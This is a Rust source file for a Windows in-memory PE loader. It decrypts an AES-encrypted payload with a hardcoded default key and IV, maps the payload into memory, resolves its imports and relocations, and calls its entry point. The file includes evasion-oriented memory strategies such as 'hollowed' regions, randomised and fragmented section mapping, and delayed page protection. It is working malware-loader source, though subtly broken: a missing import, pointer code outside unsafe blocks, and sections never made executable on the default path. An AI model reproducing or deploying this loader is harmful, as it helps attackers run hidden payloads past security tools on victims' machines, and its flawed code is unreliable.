
use std::mem::{size_of, transmute};
use std::ptr::{copy_nonoverlapping, null_mut, write_bytes};
use anyhow::Result;

#[cfg(target_os = "windows")]
use aes::Aes256;
#[cfg(target_os = "windows")]
use cbc::Decryptor;
#[cfg(target_os = "windows")]
use cbc::cipher::{
    BlockDecryptMut,
    block_padding::Pkcs7,
    KeyIvInit,
};

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Diagnostics::Debug::{
    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE,
    IMAGE_FILE_MACHINE_AMD64, IMAGE_OPTIONAL_HEADER64, IMAGE_SECTION_HEADER,
    IMAGE_BASE_RELOCATION, IMAGE_IMPORT_DESCRIPTOR, IMAGE_IMPORT_BY_NAME,
    IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_BASERELOC,
    IMAGE_REL_BASED_ABSOLUTE, IMAGE_REL_BASED_HIGHLOW, IMAGE_REL_BASED_DIR64,
};

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
    PAGE_READONLY, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
    IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_WRITE,
};

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::LibraryLoader::{
    LoadLibraryA, GetProcAddress
};

#[derive(thiserror::Error, Debug)]
pub enum LoaderError {
    #[error("I/O error: {0}")]
    IoError(#[from] std::io::Error),
    
    #[error("Decryption error: {0}")]
    DecryptionError(String),
    
    #[error("Invalid PE format: {0}")]
    InvalidPeFormat(String),
    
    #[error("Memory operation failed: {0}")]
    MemoryOperationFailed(String),
    
    #[error("Import resolution failed: {0}")]
    ImportResolutionFailed(String),
    
    #[error("Relocation failed: {0}")]
    RelocationFailed(String),
    
    #[error("Not supported on this platform")]
    NotSupported,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum MemoryAllocationStrategy {
    Standard,
    
    NonContiguous,
    
    RandomPadding,
    
    ReverseOrder,
    
    HollowedRegion,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum SectionMappingStrategy {
    Standard,
    
    RandomOrder,
    
    Fragmented,
    
    CustomProtection,
    
    DelayedProtection,
}

#[derive(Debug, Clone)]
pub struct LoaderConfig {
    pub memory_strategy: MemoryAllocationStrategy,
    pub section_strategy: SectionMappingStrategy,
}

impl Default for LoaderConfig {
    fn default() -> Self {
        Self {
            memory_strategy: MemoryAllocationStrategy::Standard,
            section_strategy: SectionMappingStrategy::Standard,
        }
    }
}

#[cfg(target_os = "windows")]
const DEFAULT_AES_KEY: [u8; 32] = *b"ThisIs32BytesOfAKeyForAES-256!!"; // 32 bytes
#[cfg(target_os = "windows")]
const DEFAULT_AES_IV:  [u8; 16] = *b"16BytesOfInitVec";                // 16 bytes

#[cfg(target_os = "windows")]
pub fn get_aes_key() -> [u8; 32] {
    match std::env::var("AES_KEY") {
        Ok(key) => {
            if key.len() == 32 {
                let mut result = [0u8; 32];
                result.copy_from_slice(key.as_bytes());
                result
            } else {
                eprintln!("Warning: AES_KEY environment variable is not 32 bytes. Using default key.");
                DEFAULT_AES_KEY
            }
        },
        Err(_) => {
            eprintln!("Warning: AES_KEY environment variable not found. Using default key.");
            DEFAULT_AES_KEY
        }
    }
}

#[cfg(target_os = "windows")]
pub fn get_aes_iv() -> [u8; 16] {
    match std::env::var("AES_IV") {
        Ok(iv) => {
            if iv.len() == 16 {
                let mut result = [0u8; 16];
                result.copy_from_slice(iv.as_bytes());
                result
            } else {
                eprintln!("Warning: AES_IV environment variable is not 16 bytes. Using default IV.");
                DEFAULT_AES_IV
            }
        },
        Err(_) => {
            eprintln!("Warning: AES_IV environment variable not found. Using default IV.");
            DEFAULT_AES_IV
        }
    }
}

#[cfg(target_os = "windows")]
pub fn decrypt_aes256_cbc(
    ciphertext: &[u8],
    key: &[u8],
    iv: &[u8],
) -> Result<Vec<u8>, LoaderError> {
    if key.len() != 32 || iv.len() != 16 {
        return Err(LoaderError::DecryptionError("Key must be 32 bytes, IV must be 16 bytes.".into()));
    }
    let cipher = Decryptor::<Aes256>::new_from_slices(key, iv)
        .map_err(|_| LoaderError::DecryptionError("new_from_slices failed (invalid key/iv?)".to_string()))?;
    cipher
        .decrypt_padded_vec_mut::<Pkcs7>(ciphertext)
        .map_err(|e| LoaderError::DecryptionError(format!("AES-256-CBC decryption failed: {:?}", e)))
}

#[cfg(target_os = "windows")]
pub fn load_pe(pe_data: &[u8]) -> Result<i32, LoaderError> {
    load_pe_with_config(pe_data, &LoaderConfig::default())
}

#[cfg(target_os = "windows")]
pub fn load_pe_with_config(pe_data: &[u8], config: &LoaderConfig) -> Result<i32, LoaderError> {
    let dos_header = unsafe { &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) };
    if dos_header.e_magic != IMAGE_DOS_SIGNATURE as u16 {
        return Err(LoaderError::InvalidPeFormat("Not a valid PE file (MZ signature not found)".into()));
    }

    let nt_headers_offset = dos_header.e_lfanew as usize;
    let nt_header_64 = unsafe {
        &*(pe_data.as_ptr().add(nt_headers_offset) as *const IMAGE_NT_HEADERS64)
    };
    if nt_header_64.Signature != IMAGE_NT_SIGNATURE {
        return Err(LoaderError::InvalidPeFormat("Invalid PE signature".into()));
    }
    if nt_header_64.FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 {
        return Err(LoaderError::InvalidPeFormat("This loader only supports 64-bit AMD64 PEs".into()));
    }

    let opt_header = &nt_header_64.OptionalHeader;
    let image_size = opt_header.SizeOfImage as usize;
    let entry_rva  = opt_header.AddressOfEntryPoint as usize;
    let preferred_base = opt_header.ImageBase as usize;

    let alloc_base = match config.memory_strategy {
        MemoryAllocationStrategy::Standard => allocate_standard_memory(image_size)?,
        MemoryAllocationStrategy::NonContiguous => allocate_non_contiguous_memory(image_size)?,
        MemoryAllocationStrategy::RandomPadding => allocate_memory_with_padding(image_size)?,
        MemoryAllocationStrategy::ReverseOrder => allocate_memory_reverse_order(image_size)?,
        MemoryAllocationStrategy::HollowedRegion => allocate_hollowed_region_memory(image_size)?,
    };

    unsafe {
        copy_nonoverlapping(
            pe_data.as_ptr(),
            alloc_base as *mut u8,
            opt_header.SizeOfHeaders as usize,
        );
    }

    let num_sections = nt_header_64.FileHeader.NumberOfSections as usize;
    let section_header_ptr = unsafe {
        pe_data.as_ptr()
            .add(nt_headers_offset)
            .add(size_of::<IMAGE_NT_HEADERS64>())
    } as *const IMAGE_SECTION_HEADER;

    let sections = unsafe { slice::from_raw_parts(section_header_ptr, num_sections) };
    
    match config.section_strategy {
        SectionMappingStrategy::Standard => map_sections_standard(alloc_base, pe_data, sections)?,
        SectionMappingStrategy::RandomOrder => map_sections_random_order(alloc_base, pe_data, sections)?,
        SectionMappingStrategy::Fragmented => map_sections_fragmented(alloc_base, pe_data, sections)?,
        SectionMappingStrategy::CustomProtection => map_sections_custom_protection(alloc_base, pe_data, sections)?,
        SectionMappingStrategy::DelayedProtection => map_sections_delayed_protection(alloc_base, pe_data, sections)?,
    };

    if opt_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress != 0 {
        resolve_imports(alloc_base as usize, opt_header)
            .map_err(|e| LoaderError::ImportResolutionFailed(e))?;
    }

    apply_relocations(alloc_base as usize, preferred_base, opt_header)
        .map_err(|e| LoaderError::RelocationFailed(e))?;

    unsafe {
        let mut old_protect = 0;
        VirtualProtect(
            alloc_base,
            opt_header.SizeOfHeaders as usize,
            PAGE_READONLY,
            &mut old_protect,
        );
    }

    let entry_point = alloc_base as usize + entry_rva;
    println!("Calling entry point at: 0x{:X}", entry_point);
    let exit_code = unsafe {
        let entry_fn: extern "system" fn() -> i32 = transmute(entry_point);
        entry_fn()
    };
    println!("Payload returned exit code: {}", exit_code);

    Ok(exit_code)
}

#[cfg(target_os = "windows")]
fn resolve_imports(image_base: usize, opt_header: &IMAGE_OPTIONAL_HEADER64) -> Result<(), String> {
    let import_dir = opt_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    let import_desc_ptr = (image_base + import_dir.VirtualAddress as usize) as *const IMAGE_IMPORT_DESCRIPTOR;

    unsafe {
        let mut idx = 0;
        loop {
            let desc = *import_desc_ptr.add(idx);
            if desc.Name == 0 {
                break; // No more import descriptors
            }
            let dll_name_ptr_u8 = (image_base + desc.Name as usize) as *const u8;

            let dll_handle = LoadLibraryA(dll_name_ptr_u8);
            if dll_handle == 0 {
                let dll_name_i8 = dll_name_ptr_u8 as *const i8;
                let dll_name = std::ffi::CStr::from_ptr(dll_name_i8).to_string_lossy();
                return Err(format!("Failed to load library: {}", dll_name));
            }

            let mut oft_ptr = (image_base + desc.OriginalFirstThunk as usize) as *const usize;
            let mut ft_ptr  = (image_base + desc.FirstThunk as usize) as *mut usize;

            if desc.OriginalFirstThunk == 0 {
                oft_ptr = ft_ptr as *const usize;
            }

            let mut i = 0;
            loop {
                let lookup_val = *oft_ptr.add(i);
                if lookup_val == 0 {
                    break; // end of this import descriptor
                }

                let func_addr: usize;

                if (lookup_val & 0x8000000000000000) != 0 {
                    let ordinal = (lookup_val & 0xFFFF) as u16;
                    let proc_opt = GetProcAddress(dll_handle, ordinal as *const u8);
                    if let Some(fn_ptr) = proc_opt {
                        func_addr = fn_ptr as usize;
                    } else {
                        return Err(format!("Failed to resolve ordinal {}", ordinal));
                    }
                } else {
                    let ibn_ptr = (image_base + lookup_val as usize) as *const IMAGE_IMPORT_BY_NAME;
                    let name_ptr_u8 = (*ibn_ptr).Name.as_ptr();
                    let proc_opt = GetProcAddress(dll_handle, name_ptr_u8);
                    if let Some(fn_ptr) = proc_opt {
                        func_addr = fn_ptr as usize;
                    } else {
                        let name_i8 = name_ptr_u8 as *const i8;
                        let func_name = std::ffi::CStr::from_ptr(name_i8).to_string_lossy();
                        return Err(format!("Failed to resolve import by name: {}", func_name));
                    }
                }

                *ft_ptr.add(i) = func_addr;
                i += 1;
            }
            idx += 1;
        }
    }
    Ok(())
}

#[cfg(target_os = "windows")]
fn apply_relocations(
    image_base: usize,
    preferred_base: usize,
    opt_header: &IMAGE_OPTIONAL_HEADER64
) -> Result<(), String> {
    let base_reloc_dir = opt_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    let reloc_va  = base_reloc_dir.VirtualAddress as usize;
    let reloc_end = reloc_va + base_reloc_dir.Size as usize;

    if reloc_va == 0 {
        return Ok(()); // no relocations
    }
    let delta = (image_base as isize) - (preferred_base as isize);
    if delta == 0 {
        return Ok(()); // loaded at preferred base
    }

    unsafe {
        let mut current_block = (image_base + reloc_va) as *const IMAGE_BASE_RELOCATION;
        while (current_block as usize) < (image_base + reloc_end) {
            let block = *current_block;
            if block.SizeOfBlock == 0 {
                break;
            }
            let entries_count = (block.SizeOfBlock as usize - size_of::<IMAGE_BASE_RELOCATION>()) / 2;
            let reloc_info_ptr = (current_block as usize + size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;

            for i in 0..entries_count {
                let entry = *reloc_info_ptr.add(i);
                let reloc_type = entry >> 12;
                let offset     = entry & 0xFFF;

                match reloc_type as u32 {
                    IMAGE_REL_BASED_ABSOLUTE => { /* no fixup needed */ }
                    IMAGE_REL_BASED_DIR64 => {
                        let patch_addr = (image_base + block.VirtualAddress as usize + offset as usize) as *mut usize;
                        *patch_addr = (*patch_addr as isize + delta) as usize;
                    }
                    IMAGE_REL_BASED_HIGHLOW => {
                        let patch_addr = (image_base + block.VirtualAddress as usize + offset as usize) as *mut u32;
                        *patch_addr = (*patch_addr as i64 + delta as i64) as u32;
                    }
                    _ => {}
                }
            }
            current_block = (current_block as usize + block.SizeOfBlock as usize) as *const IMAGE_BASE_RELOCATION;
        }
    }
    Ok(())
}

#[cfg(target_os = "windows")]
fn set_section_permissions(
    image_base: usize,
    sections: &[IMAGE_SECTION_HEADER],
    opt_header: &IMAGE_OPTIONAL_HEADER64,
) -> Result<(), String> {
    unsafe {
        for sect in sections {
            let rva = sect.VirtualAddress as usize;
            let size = sect.Misc.VirtualSize as usize;
            if size == 0 {
                continue;
            }
            let dest_ptr = (image_base + rva) as *mut core::ffi::c_void;

            let characteristics = sect.Characteristics;
            let is_exec  = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
            let is_write = (characteristics & IMAGE_SCN_MEM_WRITE)   != 0;

            let new_protect = match (is_exec, is_write) {
                (true, true)  => PAGE_EXECUTE_READWRITE,
                (true, false) => PAGE_EXECUTE_READ,
                (false, true) => PAGE_READWRITE,
                _             => PAGE_READONLY,
            };

            let mut old_protect = 0;
            if VirtualProtect(dest_ptr, size, new_protect, &mut old_protect) == 0 {
                return Err(format!("VirtualProtect failed for section at RVA=0x{:X}", rva));
            }
        }
    }
    Ok(())
}

#[cfg(target_os = "windows")]
fn allocate_standard_memory(image_size: usize) -> Result<*mut std::ffi::c_void, LoaderError> {
    let alloc_base = unsafe {
        VirtualAlloc(
            null_mut(),
            image_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    
    if alloc_base.is_null() {
        return Err(LoaderError::MemoryOperationFailed("VirtualAlloc failed".into()));
    }
    
    Ok(alloc_base)
}

#[cfg(target_os = "windows")]
fn allocate_non_contiguous_memory(image_size: usize) -> Result<*mut std::ffi::c_void, LoaderError> {
    let alloc_base = unsafe {
        VirtualAlloc(
            null_mut(),
            image_size,
            MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    
    if alloc_base.is_null() {
        return Err(LoaderError::MemoryOperationFailed("VirtualAlloc failed during reservation".into()));
    }
    
    let chunk_size = 4096; // Page size
    let mut offset = 0;
    
    while offset < image_size {
        let size = std::cmp::min(chunk_size, image_size - offset);
        let addr = (alloc_base as usize + offset) as *mut std::ffi::c_void;
        
        let result = unsafe {
            VirtualAlloc(
                addr,
                size,
                MEM_COMMIT,
                PAGE_READWRITE,
            )
        };
        
        if result.is_null() {
            return Err(LoaderError::MemoryOperationFailed(
                format!("VirtualAlloc failed during commit at offset {}", offset)
            ));
        }
        
        offset += size;
    }
    
    Ok(alloc_base)
}

#[cfg(target_os = "windows")]
fn allocate_memory_with_padding(image_size: usize) -> Result<*mut std::ffi::c_void, LoaderError> {
    let padding = (std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() % 4096) as usize;
    
    let padded_size = image_size + padding;
    
    let alloc_base = unsafe {
        VirtualAlloc(
            null_mut(),
            padded_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    
    if alloc_base.is_null() {
        return Err(LoaderError::MemoryOperationFailed("VirtualAlloc failed with padding".into()));
    }
    
    Ok(alloc_base)
}

#[cfg(target_os = "windows")]
fn allocate_memory_reverse_order(image_size: usize) -> Result<*mut std::ffi::c_void, LoaderError> {
    let hint_address = 0x7FFFFFFFFF0000 as *mut std::ffi::c_void;
    
    let alloc_base = unsafe {
        VirtualAlloc(
            hint_address,
            image_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    
    if alloc_base.is_null() {
        return allocate_standard_memory(image_size);
    }
    
    Ok(alloc_base)
}

#[cfg(target_os = "windows")]
fn allocate_hollowed_region_memory(image_size: usize) -> Result<*mut std::ffi::c_void, LoaderError> {
    let extra_size = 8192 + (std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() % 4096) as usize;
    
    let total_size = image_size + extra_size;
    
    let alloc_base = unsafe {
        VirtualAlloc(
            null_mut(),
            total_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    
    if alloc_base.is_null() {
        return Err(LoaderError::MemoryOperationFailed("VirtualAlloc failed for hollowed region".into()));
    }
    
    let hollow_start = (alloc_base as usize + 4096) as *mut std::ffi::c_void;
    let hollow_size = image_size;
    
    unsafe {
        windows_sys::Win32::System::Memory::VirtualFree(
            hollow_start,
            hollow_size,
            windows_sys::Win32::System::Memory::MEM_DECOMMIT,
        );
        
        let result = VirtualAlloc(
            hollow_start,
            hollow_size,
            MEM_COMMIT,
            PAGE_READWRITE,
        );
        
        if result.is_null() {
            return Err(LoaderError::MemoryOperationFailed("Failed to allocate hollowed region".into()));
        }
    }
    
    Ok(hollow_start)
}

#[cfg(target_os = "windows")]
fn map_sections_standard(
    alloc_base: *mut std::ffi::c_void,
    pe_data: &[u8],
    sections: &[IMAGE_SECTION_HEADER],
) -> Result<(), LoaderError> {
    for sect in sections {
        let dest_ptr = (alloc_base as usize + sect.VirtualAddress as usize) as *mut u8;
        let raw_size = sect.SizeOfRawData as usize;
        let virt_size = sect.Misc.VirtualSize as usize;

        if raw_size > 0 {
            let src_ptr = pe_data.as_ptr().add(sect.PointerToRawData as usize);
            unsafe {
                copy_nonoverlapping(src_ptr, dest_ptr, raw_size);
            }
        }
        if virt_size > raw_size {
            unsafe {
                write_bytes(
                    dest_ptr.add(raw_size),
                    0,
                    virt_size - raw_size,
                );
            }
        }
    }
    
    Ok(())
}

#[cfg(target_os = "windows")]
fn map_sections_random_order(
    alloc_base: *mut std::ffi::c_void,
    pe_data: &[u8],
    sections: &[IMAGE_SECTION_HEADER],
) -> Result<(), LoaderError> {
    let mut indices: Vec<usize> = (0..sections.len()).collect();
    
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    
    for i in (1..indices.len()).rev() {
        let j = (seed % (i as u128 + 1)) as usize;
        indices.swap(i, j);
    }
    
    for &idx in &indices {
        let sect = &sections[idx];
        let dest_ptr = (alloc_base as usize + sect.VirtualAddress as usize) as *mut u8;
        let raw_size = sect.SizeOfRawData as usize;
        let virt_size = sect.Misc.VirtualSize as usize;

        if raw_size > 0 {
            let src_ptr = pe_data.as_ptr().add(sect.PointerToRawData as usize);
            unsafe {
                copy_nonoverlapping(src_ptr, dest_ptr, raw_size);
            }
        }
        if virt_size > raw_size {
            unsafe {
                write_bytes(
                    dest_ptr.add(raw_size),
                    0,
                    virt_size - raw_size,
                );
            }
        }
    }
    
    Ok(())
}

#[cfg(target_os = "windows")]
fn map_sections_fragmented(
    alloc_base: *mut std::ffi::c_void,
    pe_data: &[u8],
    sections: &[IMAGE_SECTION_HEADER],
) -> Result<(), LoaderError> {
    for sect in sections {
        let dest_ptr = (alloc_base as usize + sect.VirtualAddress as usize) as *mut u8;
        let raw_size = sect.SizeOfRawData as usize;
        let virt_size = sect.Misc.VirtualSize as usize;

        if raw_size > 0 {
            let chunk_size = 1024; // 1KB chunks
            let mut offset = 0;
            
            while offset < raw_size {
                let size = std::cmp::min(chunk_size, raw_size - offset);
                let src_chunk_ptr = unsafe { pe_data.as_ptr().add(sect.PointerToRawData as usize + offset) };
                let dest_chunk_ptr = unsafe { dest_ptr.add(offset) };
                
                unsafe {
                    copy_nonoverlapping(src_chunk_ptr, dest_chunk_ptr, size);
                }
                
                offset += size;
                
                if offset < raw_size {
                    std::thread::sleep(std::time::Duration::from_micros(1));
                }
            }
        }
        
        if virt_size > raw_size {
            unsafe {
                write_bytes(
                    dest_ptr.add(raw_size),
                    0,
                    virt_size - raw_size,
                );
            }
        }
    }
    
    Ok(())
}

#[cfg(target_os = "windows")]
fn map_sections_custom_protection(
    alloc_base: *mut std::ffi::c_void,
    pe_data: &[u8],
    sections: &[IMAGE_SECTION_HEADER],
) -> Result<(), LoaderError> {
    for sect in sections {
        let dest_ptr = (alloc_base as usize + sect.VirtualAddress as usize) as *mut u8;
        let raw_size = sect.SizeOfRawData as usize;
        let virt_size = sect.Misc.VirtualSize as usize;

        if raw_size > 0 {
            let src_ptr = pe_data.as_ptr().add(sect.PointerToRawData as usize);
            unsafe {
                copy_nonoverlapping(src_ptr, dest_ptr, raw_size);
            }
        }
        
        if virt_size > raw_size {
            unsafe {
                write_bytes(
                    dest_ptr.add(raw_size),
                    0,
                    virt_size - raw_size,
                );
            }
        }
        
        let virt_addr = (alloc_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
        if virt_size > 0 {
            let characteristics = sect.Characteristics;
            let is_exec = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
            let is_write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;
            
            let mut old_protect = 0;
            unsafe {
                VirtualProtect(
                    virt_addr,
                    virt_size,
                    PAGE_READWRITE,
                    &mut old_protect,
                );
                
                let final_protect = match (is_exec, is_write) {
                    (true, true) => PAGE_EXECUTE_READWRITE,
                    (true, false) => PAGE_EXECUTE_READ,
                    (false, true) => PAGE_READWRITE,
                    _ => PAGE_READONLY,
                };
                
                VirtualProtect(
                    virt_addr,
                    virt_size,
                    final_protect,
                    &mut old_protect,
                );
            }
        }
    }
    
    Ok(())
}

#[cfg(target_os = "windows")]
fn map_sections_delayed_protection(
    alloc_base: *mut std::ffi::c_void,
    pe_data: &[u8],
    sections: &[IMAGE_SECTION_HEADER],
) -> Result<(), LoaderError> {
    for sect in sections {
        let dest_ptr = (alloc_base as usize + sect.VirtualAddress as usize) as *mut u8;
        let raw_size = sect.SizeOfRawData as usize;
        let virt_size = sect.Misc.VirtualSize as usize;

        if raw_size > 0 {
            let src_ptr = pe_data.as_ptr().add(sect.PointerToRawData as usize);
            unsafe {
                copy_nonoverlapping(src_ptr, dest_ptr, raw_size);
            }
        }
        
        if virt_size > raw_size {
            unsafe {
                write_bytes(
                    dest_ptr.add(raw_size),
                    0,
                    virt_size - raw_size,
                );
            }
        }
    }
    
    std::thread::sleep(std::time::Duration::from_millis(5));
    
    for sect in sections {
        let virt_addr = (alloc_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
        let virt_size = sect.Misc.VirtualSize as usize;
        
        if virt_size > 0 {
            let characteristics = sect.Characteristics;
            let is_exec = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
            let is_write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;
            
            let new_protect = match (is_exec, is_write) {
                (true, true) => PAGE_EXECUTE_READWRITE,
                (true, false) => PAGE_EXECUTE_READ,
                (false, true) => PAGE_READWRITE,
                _ => PAGE_READONLY,
            };
            
            let mut old_protect = 0;
            unsafe {
                VirtualProtect(
                    virt_addr,
                    virt_size,
                    new_protect,
                    &mut old_protect,
                );
            }
        }
    }
    
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn load_pe(_pe_data: &[u8]) -> Result<i32, LoaderError> {
    Err(LoaderError::NotSupported)
}

#[cfg(target_os = "windows")]
pub fn load_encrypted_pe(encrypted_data: &[u8], key: &[u8], iv: &[u8]) -> Result<i32, LoaderError> {
    println!("Decrypting payload...");
    let decrypted_payload = decrypt_aes256_cbc(encrypted_data, key, iv)?;
    
    load_pe(&decrypted_payload)
}

#[cfg(target_os = "windows")]
pub fn load_encrypted_pe_with_config(
    encrypted_data: &[u8], 
    key: &[u8], 
    iv: &[u8], 
    config: &LoaderConfig
) -> Result<i32, LoaderError> {
    println!("Decrypting payload with custom loading configuration...");
    let decrypted_payload = decrypt_aes256_cbc(encrypted_data, key, iv)?;
    
    load_pe_with_config(&decrypted_payload, config)
}

#[cfg(not(target_os = "windows"))]
pub fn load_encrypted_pe(_encrypted_data: &[u8], _key: &[u8], _iv: &[u8]) -> Result<i32, LoaderError> {
    Err(LoaderError::NotSupported)
}
